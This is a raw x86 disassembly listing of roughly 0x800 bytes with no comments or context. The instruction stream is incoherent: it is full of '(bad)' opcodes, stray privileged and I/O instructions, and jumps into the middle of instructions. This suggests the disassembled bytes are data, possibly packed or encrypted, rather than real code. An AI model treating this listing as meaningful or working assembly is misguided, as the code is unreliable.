  414d4d:	cmp    eax,0x44402aac
  414d52:	push   ds
  414d53:	sub    ch,BYTE PTR [ebp-0x3f979e71]
  414d59:	imul   edi,ecx,0x1d
  414d5c:	pop    ecx
  414d5d:	pop    es
  414d5e:	xchg   ebp,eax
  414d5f:	test   ch,dh
  414d61:	xor    eax,0x6a7bbde4
  414d66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d67:	nop
  414d68:	sbb    al,0x63
  414d6a:	sub    eax,0x6dbce3fd
  414d6f:	mov    WORD PTR [ecx+ecx*8-0x6e],?
  414d73:	or     ch,BYTE PTR [ebp-0x169ad34f]
  414d79:	mov    eax,ds:0x59d3e722
  414d7e:	adc    eax,0xd7af0a99
  414d83:	(bad)  
  414d84:	mov    eax,0xf2ac346c
  414d89:	nop
  414d8a:	inc    esp
  414d8b:	cmp    eax,0x9072237e
  414d90:	scas   al,BYTE PTR es:[edi]
  414d91:	and    eax,DWORD PTR [edi]
  414d93:	ins    BYTE PTR es:[edi],dx
  414d94:	aad    0x2f
  414d96:	jp     0x414d6d
  414d98:	inc    esi
  414d99:	in     al,0xf3
  414d9b:	(bad)  
  414d9c:	ds stos DWORD PTR es:[edi],eax
  414d9e:	mov    ds:0x2ece75e1,eax
  414da3:	sbb    eax,0x9d9e7c0c
  414da8:	or     eax,0xd1d5c010
  414dad:	sub    al,BYTE PTR [ebx]
  414daf:	jno    0x414df8
  414db1:	aam    0x8a
  414db3:	push   ecx
  414db4:	and    BYTE PTR [esi+0x33996a5c],0x67
  414dbb:	and    al,0xce
  414dbd:	je     0x414e37
  414dbf:	jge    0x414d77
  414dc1:	adc    edx,DWORD PTR [eax+0x29]
  414dc4:	mov    esi,DWORD PTR [esi]
  414dc6:	into   
  414dc7:	loop   0x414e11
  414dc9:	push   esi
  414dca:	mov    dl,BYTE PTR [ecx-0x2563d7ec]
  414dd0:	sub    BYTE PTR ds:0x84f1a12e,dh
  414dd6:	aam    0xa3
  414dd8:	pop    esi
  414dd9:	lea    edx,[ebx+0x21a9f5e6]
  414ddf:	xchg   edi,eax
  414de0:	inc    eax
  414de1:	retf   0x4f0d
  414de4:	(bad)  
  414de5:	rol    edi,1
  414de7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414de8:	fimul  WORD PTR [edi-0x11]
  414deb:	arpl   WORD PTR [ebx+0x2057a425],bx
  414df1:	shl    ecx,cl
  414df3:	mov    eax,0x68b8c4c7
  414df8:	sbb    BYTE PTR [edx],0xc2
  414dfb:	cmp    BYTE PTR [ebx-0x1e],ah
  414dfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dff:	jo     0x414dfd
  414e01:	stos   BYTE PTR es:[edi],al
  414e02:	cwde   
  414e03:	sbb    al,0x43
  414e05:	adc    eax,0x3f6177b9
  414e0a:	pop    eax
  414e0b:	daa    
  414e0c:	(bad)  
  414e0d:	shr    ecx,1
  414e0f:	mov    dh,0x7a
  414e11:	cmp    BYTE PTR [edi],cl
  414e13:	cmp    DWORD PTR [edx+0x31cea756],0xfffffffa
  414e1a:	mov    bl,0x41
  414e1c:	out    dx,al
  414e1d:	popf   
  414e1e:	out    dx,al
  414e1f:	jg     0x414de0
  414e21:	sub    DWORD PTR [edx+0x43],esi
  414e24:	loop   0x414ea3
  414e26:	jne    0x414e89
  414e28:	dec    esp
  414e29:	sbb    ah,dh
  414e2b:	test   al,0x2
  414e2d:	jmp    0x414e2b
  414e2f:	cmp    edx,DWORD PTR [ebp-0x3cb990ab]
  414e35:	hlt    
  414e36:	cmp    DWORD PTR [ebp+0x1f],esp
  414e39:	pop    ebp
  414e3a:	mov    ecx,0x90ea9d79
  414e3f:	(bad)  
  414e40:	jmp    0x414e3c
  414e42:	loop   0x414eb0
  414e44:	push   eax
  414e45:	sti    
  414e46:	push   ebp
  414e47:	xor    dl,BYTE PTR [ebp+ebx*4+0x43]
  414e4b:	retf   0x19d8
  414e4e:	popf   
  414e4f:	into   
  414e50:	dec    ebx
  414e51:	and    eax,0xa8c66d7d
  414e56:	jno    0x414ec2
  414e58:	rcl    eax,1
  414e5a:	aam    0xa9
  414e5c:	mov    ebp,0x947d66bf
  414e61:	stos   DWORD PTR es:[edi],eax
  414e62:	pop    esi
  414e63:	jecxz  0x414e31
  414e65:	mov    ds:0x6246614,al
  414e6a:	rcl    BYTE PTR [ebx],0x81
  414e6d:	jl     0x414e3f
  414e6f:	push   ds
  414e70:	mov    edi,0x62aaa229
  414e75:	mov    dl,0x3
  414e77:	dec    ebp
  414e78:	stc    
  414e79:	pop    esp
  414e7a:	pop    es
  414e7b:	xor    edi,0xebd3031a
  414e81:	sub    eax,DWORD PTR [ebp+0x44f5c96c]
  414e87:	jne    0x414e3f
  414e89:	dec    ecx
  414e8a:	mov    eax,ds:0xcb6fed3a
  414e8f:	cmc    
  414e90:	dec    edx
  414e91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e92:	xchg   esp,eax
  414e93:	cs mov ecx,0xa93e9c40
  414e99:	and    ah,dl
  414e9b:	sbb    dh,al
  414e9d:	and    DWORD PTR [eax-0x68c2b40a],esi
  414ea3:	sub    cl,BYTE PTR [edx+0x1d]
  414ea6:	mov    ds:0x602b7947,eax
  414eab:	xor    eax,0xe4b6f50b
  414eb0:	pop    esi
  414eb1:	xor    ch,BYTE PTR gs:[edx-0x62a615c4]
  414eb8:	inc    esi
  414eb9:	repz ds jp 0x414ea1
  414ebd:	outs   dx,BYTE PTR ds:[esi]
  414ebe:	xchg   esp,eax
  414ebf:	xlat   BYTE PTR ds:[ebx]
  414ec0:	retf   
  414ec1:	xchg   ebp,eax
  414ec2:	jmp    0xc8b4:0xee8391d7
  414ec9:	xchg   ecx,eax
  414eca:	repz in al,0x14
  414ecd:	mov    dh,0x1b
  414ecf:	mov    ds:0xbc799947,eax
  414ed4:	dec    ebx
  414ed5:	cmp    eax,0xfd84d0d0
  414eda:	popf   
  414edb:	mov    bh,BYTE PTR [esp+edx*8]
  414ede:	push   0x9a1a7dda
  414ee3:	jne    0x414e92
  414ee5:	in     eax,dx
  414ee6:	dec    ebp
  414ee7:	xor    esp,ecx
  414ee9:	jnp    0x414efb
  414eeb:	dec    esp
  414eec:	test   eax,0xe17aa4b
  414ef1:	imul   BYTE PTR [ecx*1+0x2dac2b6b]
  414ef8:	(bad)  
  414ef9:	push   ecx
  414efa:	lds    edx,FWORD PTR [eax+0x3eed3521]
  414f00:	into   
  414f01:	xchg   DWORD PTR [edx],esi
  414f03:	nop
  414f04:	xchg   edx,eax
  414f05:	mov    WORD PTR [eax+0x1f],ds
  414f08:	ins    DWORD PTR es:[edi],dx
  414f09:	fs pop esp
  414f0b:	clc    
  414f0c:	ret    
  414f0d:	imul   ebp,DWORD PTR [eax],0xffffffef
  414f10:	cmp    dh,BYTE PTR [edx+0x5b]
  414f13:	jo     0x414f50
  414f15:	in     al,dx
  414f16:	pop    edx
  414f17:	pop    edi
  414f18:	aam    0x16
  414f1a:	fcom   QWORD PTR [ecx+0x2b]
  414f1d:	fcomi  st,st(5)
  414f1f:	icebp  
  414f20:	stos   DWORD PTR es:[edi],eax
  414f21:	ds push cs
  414f23:	inc    edx
  414f24:	sub    dh,0x98
  414f27:	dec    edx
  414f28:	aam    0x1b
  414f2a:	jnp    0x414f68
  414f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f2d:	sahf   
  414f2e:	dec    esi
  414f2f:	mov    ebp,0xd9936559
  414f34:	mov    dl,0xc6
  414f36:	pop    ecx
  414f37:	aaa    
  414f38:	scas   eax,DWORD PTR es:[edi]
  414f39:	repz pop eax
  414f3b:	dec    edi
  414f3c:	inc    ecx
  414f3d:	inc    edx
  414f3e:	scas   eax,DWORD PTR es:[edi]
  414f3f:	push   ebx
  414f40:	xchg   esp,eax
  414f41:	jmp    0x414f0b
  414f43:	addr16 push cs
  414f45:	cmp    ch,BYTE PTR [edx]
  414f47:	add    BYTE PTR [esi],dl
  414f49:	lea    esi,[ebx+0x1cbc15]
  414f4f:	mov    ah,0xbf
  414f51:	mov    es,eax
  414f53:	pop    ebp
  414f54:	mov    ecx,0xc3d1c14e
  414f59:	add    esi,edi
  414f5b:	pop    esp
  414f5c:	mov    al,al
  414f5e:	xor    al,0x32
  414f60:	cmc    
  414f61:	dec    esi
  414f62:	xor    al,0xc
  414f64:	push   ss
  414f65:	xor    eax,0xcf5cae8e
  414f6a:	jnp    0x414f01
  414f6c:	jno    0x414fe2
  414f6e:	and    eax,DWORD PTR [edi]
  414f70:	dec    esi
  414f71:	mov    ?,WORD PTR [ebp-0x3515bace]
  414f77:	out    0xa8,eax
  414f79:	sti    
  414f7a:	xchg   edx,eax
  414f7b:	jle    0x414fba
  414f7d:	adc    edx,DWORD PTR [ecx-0x6a]
  414f80:	lea    edi,[edx+0x58]
  414f83:	gs adc edi,esp
  414f86:	sahf   
  414f87:	je     0x414f26
  414f89:	std    
  414f8a:	test   eax,0x6d956da5
  414f8f:	xlat   BYTE PTR ds:[ebx]
  414f90:	cli    
  414f91:	pop    ecx
  414f92:	(bad)
  414f95:	in     al,0x4a
  414f97:	dec    ecx
  414f98:	sub    DWORD PTR [ebx+0x55],eax
  414f9b:	pop    esi
  414f9c:	xchg   ebp,eax
  414f9d:	mov    edi,0x4ff65b7a
  414fa2:	mov    ebp,0xce77539d
  414fa7:	lahf   
  414fa8:	jmp    0xd991:0xea17879a
  414faf:	scas   eax,DWORD PTR es:[edi]
  414fb0:	fidivr DWORD PTR [esi+0x4ce0b673]
  414fb6:	ret    0xdbc7
  414fb9:	mov    al,0xfa
  414fbb:	mov    ah,0x8f
  414fbd:	sahf   
  414fbe:	outs   dx,DWORD PTR ds:[esi]
  414fbf:	and    al,bh
  414fc1:	inc    esi
  414fc2:	mov    WORD PTR [esi],ds
  414fc4:	js     0x414f70
  414fc6:	cmp    ch,BYTE PTR [edx+esi*4+0x625b6754]
  414fcd:	fnstsw WORD PTR [edx]
  414fcf:	dec    esi
  414fd0:	into   
  414fd1:	fwait
  414fd2:	cmp    BYTE PTR [ebx],0x65
  414fd5:	xchg   esp,eax
  414fd6:	add    DWORD PTR [eax-0x2ce1e739],eax
  414fdc:	jmp    0x55475416
  414fe1:	or     cl,BYTE PTR [ebp-0x78942ae9]
  414fe7:	dec    esp
  414fe8:	scas   al,BYTE PTR es:[edi]
  414fe9:	add    cl,BYTE PTR [edx-0x77]
  414fec:	jp     0x414f97
  414fee:	lock adc al,0x3d
  414ff1:	aad    0xa3
  414ff3:	test   al,0x12
  414ff5:	xchg   ebp,eax
  414ff6:	push   0xacea146d
  414ffb:	and    ebx,DWORD PTR [edi+0x27d90a4c]
  415001:	pop    ebx
  415002:	sti    
  415003:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415004:	pusha  
  415005:	aad    0x92
  415007:	jp     0x414fde
  415009:	mov    ebx,0x54bb4b4c
  41500e:	jl     0x41508a
  415010:	and    eax,0x1a140c35
  415015:	mov    WORD PTR [edx],gs
  415017:	and    dl,BYTE PTR ds:0xb071b2bd
  41501d:	iret   
  41501e:	sub    eax,0xb9759ba9
  415023:	xchg   ecx,eax
  415024:	test   eax,0xc6b92bdc
  415029:	mov    ebp,0x4673656b
  41502e:	sbb    eax,edx
  415030:	mov    bl,0x57
  415032:	and    dh,bl
  415034:	push   edx
  415035:	aas    
  415036:	aad    0x28
  415038:	push   ebp
  415039:	mov    ecx,0xb96b50d5
  41503e:	(bad)  
  41503f:	ret    
  415040:	xor    eax,0x4b65739d
  415045:	sbb    al,dl
  415047:	test   al,0xe
  415049:	test   BYTE PTR [ebx+eiz*8-0x72],bl
  41504d:	dec    eax
  41504e:	out    0x52,eax
  415050:	(bad)  
  415051:	shl    ch,1
  415053:	xor    eax,0xaf7ebdec
  415058:	or     al,0x92
  41505a:	mov    dl,0x25
  41505c:	jae    0x4150d0
  41505e:	not    BYTE PTR [edx+0xa]
  415061:	jno    0x41503c
  415063:	dec    edi
  415064:	into   
  415065:	xchg   DWORD PTR [edi+0x1bb1ee81],eax
  41506b:	test   DWORD PTR [esi+0x15a82c4b],esi
  415071:	mov    ds:0x5ac75bde,eax
  415076:	(bad)  
  415077:	retf   
  415078:	dec    ebp
  415079:	sti    
  41507a:	jle    0x415058
  41507c:	fcom   DWORD PTR ds:0x1d97f0b4
  415082:	or     DWORD PTR [esi-0x76],edx
  415085:	(bad)  
  415086:	fnstenv [eax+0x73]
  415089:	dec    esp
  41508a:	mov    ds:0xa6bd5efc,eax
  41508f:	sbb    bh,BYTE PTR [edx+0x1f34c0f]
  415095:	ficomp DWORD PTR [ecx-0x2a]
  415098:	test   eax,0x6be35242
  41509d:	dec    ebx
  41509e:	jge    0x41503c
  4150a0:	mov    al,0x2a
  4150a2:	jb     0x415044
  4150a4:	sbb    ah,bh
  4150a6:	xor    DWORD PTR [ecx+edx*1-0xad9cd2c],ebx
  4150ad:	and    al,0xa
  4150af:	pop    esp
  4150b0:	dec    edx
  4150b1:	mov    ch,0xd9
  4150b3:	xchg   esi,eax
  4150b4:	sbb    al,BYTE PTR [ebp-0x4ee17736]
  4150ba:	mov    bh,BYTE PTR [ecx+eax*4]
  4150bd:	(bad)  
  4150be:	imul   ebp,DWORD PTR [ebx],0xffffff9b
  4150c1:	ror    BYTE PTR [eax-0x495d6a84],0x49
  4150c8:	sar    edi,cl
  4150ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150cb:	mov    ebp,0xfd8eb91d
  4150d0:	push   esi
  4150d1:	loopne 0x4150a9
  4150d3:	(bad)  
  4150d4:	push   edx
  4150d5:	mov    dh,0xc
  4150d7:	mov    edi,0x5e787194
  4150dc:	inc    eax
  4150dd:	fld    DWORD PTR [edx+0x44]
  4150e0:	mov    esi,0x3915a0df
  4150e5:	push   ebx
  4150e6:	jno    0x4150ce
  4150e8:	xor    eax,0x9da4c31d
  4150ed:	(bad)  
  4150ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150ef:	stos   BYTE PTR es:[edi],al
  4150f0:	cmp    ah,BYTE PTR fs:[esi]
  4150f3:	aaa    
  4150f4:	sub    dh,dh
  4150f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150f7:	mov    ?,esp
  4150f9:	stc    
  4150fa:	add    eax,0x3f61605
  4150ff:	in     eax,dx
  415100:	lods   eax,DWORD PTR ds:[esi]
  415101:	xchg   edi,eax
  415102:	idiv   cl
  415104:	std    
  415105:	mov    eax,0x35e953b0
  41510a:	fcmovnbe st,st(0)
  41510c:	mov    cl,0x50
  41510e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41510f:	xor    al,0x2c
  415111:	or     ecx,ebp
  415113:	fwait
  415114:	jmp    0x41509c
  415116:	cmp    eax,DWORD PTR [ebp-0x706416e]
  41511c:	and    cl,dl
  41511e:	(bad)  
  41511f:	pop    esp
  415120:	xor    bh,BYTE PTR [edx-0x2a]
  415123:	loope  0x4150f3
  415125:	retf   
  415126:	(bad)  
  415127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415128:	in     al,dx
  415129:	inc    ecx
  41512a:	ins    DWORD PTR es:[edi],dx
  41512b:	test   al,0x54
  41512d:	dec    edi
  41512e:	xlat   BYTE PTR ds:[ebx]
  41512f:	scas   al,BYTE PTR es:[edi]
  415130:	aad    0x30
  415132:	xor    al,0x1
  415134:	add    BYTE PTR [ecx],bl
  415136:	add    dh,0xf7
  415139:	dec    esi
  41513a:	and    DWORD PTR [eax+edx*1-0x56],edx
  41513e:	cmp    al,0xcd
  415140:	enter  0xe505,0xaf
  415144:	aad    0x98
  415146:	sbb    DWORD PTR [edi],esi
  415148:	xchg   ecx,eax
  415149:	(bad)  
  41514a:	(bad)  
  41514b:	repnz popf 
  41514d:	push   cs
  41514e:	inc    edx
  41514f:	jmp    0x415138
  415151:	div    esp
  415153:	jle    0x4151b3
  415155:	aas    
  415156:	lea    ebx,[ebx+0x74992baf]
  41515c:	pop    ss
  41515d:	mov    dh,0xa2
  41515f:	mov    cl,0x2a
  415161:	jmp    0x4150e7
  415163:	mov    ah,0xd3
  415165:	xchg   esi,eax
  415166:	jmp    0x41513d
  415168:	shr    DWORD PTR [eax],cl
  41516a:	sbb    eax,0x47579a73
  41516f:	out    dx,al
  415170:	popa   
  415171:	pop    ebp
  415172:	clc    
  415173:	jmp    0xb02b:0x8bc8ab79
  41517a:	push   edx
  41517b:	bound  edx,QWORD PTR [ebp-0x3c6797d]
  415181:	push   ebx
  415182:	or     cl,BYTE PTR [esi+0xf]
  415185:	dec    esi
  415186:	stc    
  415187:	(bad)  
  415188:	jb     0x415127
  41518a:	mov    gs,WORD PTR [ecx+0x52]
  41518d:	fisub  DWORD PTR [eax+ebx*8+0x41]
  415191:	mov    al,0xab
  415193:	and    edx,DWORD PTR [edi-0x555d3971]
  415199:	inc    eax
  41519a:	(bad)  
  41519c:	adc    eax,0xb6c265d2
  4151a1:	sub    bh,BYTE PTR [ebx-0x11]
  4151a4:	xor    DWORD PTR [ebp-0x38],ebp
  4151a7:	cmp    eax,0xe61a486a
  4151ac:	icebp  
  4151ad:	sbb    dh,BYTE PTR ds:0x3dcbca3c
  4151b3:	scas   al,BYTE PTR es:[edi]
  4151b4:	xor    dl,BYTE PTR ds:0x4df79fed
  4151ba:	rol    DWORD PTR [ebx-0xb],0x57
  4151be:	jne    0x41515e
  4151c0:	cli    
  4151c1:	(bad)  
  4151c2:	icebp  
  4151c3:	aad    0x91
  4151c5:	fild   DWORD PTR [edx+0x6eb9b1a]
  4151cb:	fucomi st,st(0)
  4151cd:	(bad)  
  4151ce:	test   al,0xfd
  4151d0:	sub    BYTE PTR [eax+0x2b],bl
  4151d3:	mov    al,0x2a
  4151d5:	xor    eax,0xd219a757
  4151da:	das    
  4151db:	aaa    
  4151dc:	cli    
  4151dd:	mov    BYTE PTR [ecx-0x50],dl
  4151e0:	push   eax
  4151e1:	push   es
  4151e2:	mov    al,ds:0x38ec13df
  4151e7:	ficom  WORD PTR [ecx+0x682b4010]
  4151ed:	adc    eax,0xaeaf522a
  4151f2:	pop    esi
  4151f3:	xchg   BYTE PTR ds:0xe1538455,bl
  4151f9:	xchg   DWORD PTR [esi+eiz*4+0x1ea05282],edi
  415200:	pop    ss
  415201:	test   DWORD PTR [edi+ebp*4+0x6],ebx
  415205:	mov    al,ds:0x55057682
  41520a:	jecxz  0x415263
  41520c:	nop
  41520d:	stos   BYTE PTR es:[edi],al
  41520e:	and    ecx,DWORD PTR [edi]
  415210:	aas    
  415211:	fcomp  QWORD PTR [ebx+0x5c7a7228]
  415217:	enter  0x94b1,0xd8
  41521b:	adc    bl,bl
  41521d:	test   al,0x62
  41521f:	sub    DWORD PTR es:0x1aa82b91,edx
  415226:	adc    esi,0x45
  415229:	or     ch,bl
  41522b:	xchg   BYTE PTR [eax-0x669c78f4],ah
  415231:	mov    ah,0xba
  415233:	adc    eax,0x55241418
  415238:	mov    cl,0xdb
  41523a:	shr    BYTE PTR [edi],cl
  41523c:	popf   
  41523d:	add    edi,esi
  41523f:	lahf   
  415240:	sub    BYTE PTR [ebp+ecx*8-0x43d04a95],dh
  415247:	(bad)  
  415248:	sbb    DWORD PTR ds:0x3fb5dec7,eax
  41524e:	mov    dl,0x80
  415250:	mov    eax,ecx
  415252:	lea    ebx,[ecx-0x2b46b8a0]
  415258:	xchg   ecx,eax
  415259:	daa    
  41525a:	sbb    DWORD PTR [ebx-0x34ed682a],0x8
  415261:	jmp    0x4151e6
  415263:	(bad)  
  415264:	scas   eax,DWORD PTR es:[edi]
  415265:	lods   al,BYTE PTR ds:[esi]
  415266:	mov    al,0xe4
  415268:	xchg   ecx,eax
  415269:	dec    ebx
  41526a:	dec    esi
  41526b:	inc    esp
  41526c:	gs inc edx
  41526e:	call   0xa824:0xc357acf
  415275:	cmp    al,BYTE PTR [ebp+0x77]
  415278:	and    BYTE PTR [edi+0x5d00d4ec],0x57
  41527f:	mov    ch,0x3f
  415281:	and    eax,0xad46a006
  415286:	into   
  415287:	(bad)  
  415288:	cmc    
  415289:	lods   eax,DWORD PTR ds:[esi]
  41528a:	adc    al,0xa
  41528c:	mov    eax,0x28c2973e
  415291:	jle    0x415272
  415293:	sub    eax,0xa6fecfdc
  415298:	popf   
  415299:	and    BYTE PTR ds:0x9d0bc14a,0xbe
  4152a0:	test   al,0x51
  4152a2:	js     0x415267
  4152a4:	mov    bh,BYTE PTR [eax-0x36b170e6]
  4152aa:	pusha  
  4152ab:	aam    0x0
  4152ad:	cmp    edx,esi
  4152af:	push   cs
  4152b0:	jmp    0x415306
  4152b2:	dec    edx
  4152b3:	test   eax,0x5a1c7074
  4152b8:	cmp    dl,BYTE PTR ds:0x32f7c88a
  4152be:	mov    al,0x1e
  4152c0:	lea    edx,[ebp-0x1d69e16c]
  4152c6:	dec    ecx
  4152c7:	push   ebp
  4152c8:	jle    0x4152ff
  4152ca:	inc    esp
  4152cb:	adc    al,0xc6
  4152cd:	clc    
  4152ce:	dec    esi
  4152cf:	mov    cl,0x3a
  4152d1:	push   esi
  4152d2:	xchg   edi,eax
  4152d3:	push   edx
  4152d4:	out    dx,al
  4152d5:	dec    ebp
  4152d6:	repnz pop edx
  4152d8:	arpl   WORD PTR [ecx+0x35],sp
  4152db:	ins    BYTE PTR es:[edi],dx
  4152dc:	or     eax,0x37d21a39
  4152e1:	lahf   
  4152e2:	adc    ecx,DWORD PTR [esi+0x1e]
  4152e5:	adc    eax,0xed2d43d6
  4152ea:	das    
  4152eb:	fst    DWORD PTR [edi]
  4152ed:	scas   eax,DWORD PTR es:[edi]
  4152ee:	push   ebp
  4152ef:	mov    al,ds:0x621be7c4
  4152f4:	clc    
  4152f5:	mov    al,ds:0x12a67a8d
  4152fa:	push   ebp
  4152fb:	xlat   BYTE PTR ds:[ebx]
  4152fc:	adc    BYTE PTR [edx-0x51],cl
  4152ff:	ja     0x415350
  415301:	cmp    BYTE PTR ds:0x72d70039,bl
  415307:	lods   eax,DWORD PTR ds:[esi]
  415308:	xchg   BYTE PTR [esi+ebx*1],cl
  41530b:	scas   eax,DWORD PTR es:[edi]
  41530c:	imul   edi,DWORD PTR [eax],0xffffffd4
  41530f:	mov    bl,ah
  415311:	pop    ebx
  415312:	jnp    0x4152cc
  415314:	jecxz  0x415377
  415316:	test   eax,0xbd162e33
  41531b:	mov    bh,0x8a
  41531d:	fadd   QWORD PTR [eax-0x4c]
  415320:	iret   
  415321:	push   ds
  415322:	inc    edi
  415323:	mov    ebx,0x753e75cc
  415328:	sahf   
  415329:	pop    ebx
  41532a:	rol    BYTE PTR [edi+0x54dc1c88],cl
  415330:	ss out dx,al
  415332:	push   eax
  415333:	adc    eax,0x6d76d83c
  415338:	jb     0x41532d
  41533a:	jo     0x41537d
  41533c:	fist   DWORD PTR [edi-0x4a]
  41533f:	in     al,dx
  415340:	jge    0x415395
  415342:	xchg   DWORD PTR [ebp+0x62],ebx
  415345:	push   eax
  415346:	and    eax,DWORD PTR [eax]
  415348:	loopne 0x41537e
  41534a:	outs   dx,BYTE PTR ds:[esi]
  41534b:	sbb    al,0x6a
  41534d:	sub    BYTE PTR [edx],ah
  41534f:	mov    ecx,0x7cfbf397
  415354:	add    bh,BYTE PTR [eax+esi*1+0x11]
  415358:	mov    ecx,0xf3753bd1
  41535d:	mov    dh,0x51
  41535f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415360:	and    esp,DWORD PTR [edi+0x22]
  415363:	push   ds
  415364:	xchg   ebx,eax
  415365:	sub    DWORD PTR [ebp+0x77],ebp
  415368:	jecxz  0x4152f4
  41536a:	sbb    ch,bh
  41536c:	mov    ecx,0xeed5a52f
  415371:	test   DWORD PTR [esi+ebp*2+0x2559c6a],ebx
  415378:	sub    ecx,DWORD PTR ds:0x37d0d4a3
  41537e:	(bad)  
  41537f:	xor    BYTE PTR [esi+0x5c6b24e6],bl
  415385:	aas    
  415386:	adc    eax,0x1a4e543
  41538b:	jo     0x4153ff
  41538d:	jns    0x41539c
  41538f:	mov    DWORD PTR [eax+eiz*8+0x61],0xa70f22a9
  415397:	pop    edx
  415398:	shr    BYTE PTR [esi],cl
  41539a:	jmp    0x41533d
  41539c:	icebp  
  41539d:	dec    esi
  41539e:	mov    cl,BYTE PTR [edx*8-0x5d078505]
  4153a5:	repnz scas eax,DWORD PTR es:[edi]
  4153a7:	and    ebx,edi
  4153a9:	pop    esp
  4153aa:	mov    ch,0xa1
  4153ac:	pop    edi
  4153ad:	daa    
  4153ae:	ret    
  4153af:	pop    es
  4153b0:	xor    DWORD PTR gs:[edi+eiz*4+0x29a9e64a],ebx
  4153b8:	test   DWORD PTR [esi+0x46],0xbb29a54e
  4153bf:	mov    ah,bl
  4153c1:	retf   
  4153c2:	dec    esi
  4153c3:	fidivr DWORD PTR [ebp-0x56]
  4153c6:	daa    
  4153c7:	sub    bh,BYTE PTR [edi+0x7d801c88]
  4153cd:	or     al,0x4a
  4153cf:	jns    0x4153ec
  4153d1:	xor    DWORD PTR [edx+0x74d39413],ebp
  4153d7:	mov    WORD PTR [edx],ds
  4153d9:	nop
  4153da:	cmp    DWORD PTR [edi],0x65
  4153dd:	jmp    0x41537d
  4153df:	fmul   DWORD PTR [ebp-0x4d291aa4]
  4153e5:	jnp    0x415424
  4153e7:	mov    esp,0xd852c71c
  4153ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153ed:	xor    cl,BYTE PTR [ecx]
  4153ef:	ja     0x415425
  4153f1:	push   ecx
  4153f2:	mov    eax,0x19dff547
  4153f7:	mov    ebx,0xc5b55b3b
  4153fc:	add    DWORD PTR [eax],eax
  4153fe:	test   al,0xa2
  415400:	jmp    0xece4bca9
  415405:	or     BYTE PTR [edi],al
  415407:	test   al,0xd7
  415409:	js     0x4153f2
  41540b:	and    dh,dl
  41540d:	into   
  41540e:	sub    BYTE PTR [edx-0x6e],ch
  415411:	xchg   BYTE PTR [ecx+0x5f792987],bh
  415417:	xor    eax,0x5141f630
  41541c:	xlat   BYTE PTR ds:[ebx]
  41541d:	lea    ebx,[edi+eiz*1-0x73]
  415421:	push   esp
  415422:	xchg   edi,eax
  415423:	retf   0x4251
  415426:	push   0xffffffd6
  415428:	mov    cl,0x5e
  41542a:	es mov ah,0x8e
  41542d:	cmp    al,0x9f
  41542f:	mov    al,0x3e
  415431:	repnz pop edi
  415433:	call   0xbcf4:0x38aa1b65
  41543a:	sbb    edi,edx
  41543c:	(bad)  
  41543e:	jecxz  0x41547b
  415440:	and    esi,ecx
  415442:	mov    eax,0x7b96bd53
  415447:	loopne 0x4153db
  415449:	mov    eax,ds:0x92a8c02a
  41544e:	sar    eax,cl
  415450:	dec    eax
  415451:	addr16 mov eax,ds:0x93d8
  415455:	xchg   ecx,eax
  415456:	add    eax,DWORD PTR [edx+0x2d]
  415459:	arpl   WORD PTR [edi-0x47f1305c],bp
  41545f:	out    dx,al
  415460:	ins    DWORD PTR es:[edi],dx
  415461:	icebp  
  415462:	jle    0x4154ae
  415464:	in     al,0x40
  415466:	jns    0x4154b5
  415468:	(bad)
  41546b:	cmp    DWORD PTR [esi],ecx
  41546d:	shr    bl,cl
  41546f:	xchg   esi,eax
  415470:	aam    0xa7
  415472:	shr    BYTE PTR [esi+0x7f1a52fa],0x44
  415479:	jle    0x4153fd
  41547b:	nop
  41547c:	retf   0x15a0
  41547f:	mov    ds:0x7863c40e,eax
  415484:	add    eax,0x14a58e6b
  415489:	xchg   ebx,eax
  41548a:	stos   DWORD PTR es:[edi],eax
  41548b:	mov    ?,WORD PTR [eax-0x4a249cdd]
  415491:	aam    0x45
  415493:	jns    0x4154be
  415495:	ret    
  415496:	arpl   WORD PTR [ecx-0x71],bp
  415499:	test   eax,0xb9d0729b
  41549e:	jbe    0x4154a6
  4154a0:	mov    eax,ds:0xdf6bbcde
  4154a5:	inc    ebp
  4154a6:	in     al,0xe3
  4154a8:	imul   ebx,edx,0x67
  4154ab:	or     ah,BYTE PTR [edx-0x55c146ef]
  4154b1:	ins    DWORD PTR es:[edi],dx
  4154b2:	jmp    0x3795fac
  4154b7:	add    BYTE PTR [eax],cl
  4154b9:	mov    ebx,0xe38c5c69
  4154be:	or     BYTE PTR [edx+0x452142a8],ch
  4154c4:	mov    esi,gs
  4154c6:	sbb    DWORD PTR [edi-0x1f],esi
  4154c9:	jnp    0x4154d7
  4154cb:	stos   DWORD PTR es:[edi],eax
  4154cc:	adc    al,0x38
  4154cf:	push   edi
  4154d0:	pop    es
  4154d1:	jecxz  0x415527
  4154d3:	dec    edi
  4154d4:	jmp    0x2afef865
  4154d9:	dec    esp
  4154da:	sub    DWORD PTR [ecx+ebx*4-0x5285ae72],eax
  4154e1:	sub    al,0xa1
  4154e3:	and    eax,0xa0c87bd7
  4154e8:	ret    0xca6b
  4154eb:	imul   DWORD PTR [ebx+edx*1-0x39ae4efa]
  4154f2:	dec    edi
  4154f3:	adc    BYTE PTR [edx-0x4ffa6b9d],ch
  4154f9:	(bad)  
  4154fa:	mov    esp,0x5a39d786
  4154ff:	stos   DWORD PTR es:[edi],eax
  415500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415501:	mov    DWORD PTR [eax],ebx
  415503:	add    eax,0xb8246548
  415508:	jg     0x4154c7
  41550a:	fstp   QWORD PTR [ebx+0x17]
  41550d:	xchg   esp,eax
  41550e:	mov    ds:0xd0197c8e,eax
  415513:	ret    
  415514:	sub    BYTE PTR [edi+0x55],ah
  415517:	and    eax,0x8c1d4530
  41551c:	dec    DWORD PTR [ecx]
  41551e:	cmp    al,0x1e
  415520:	mov    dl,0xf0
  415522:	cli    
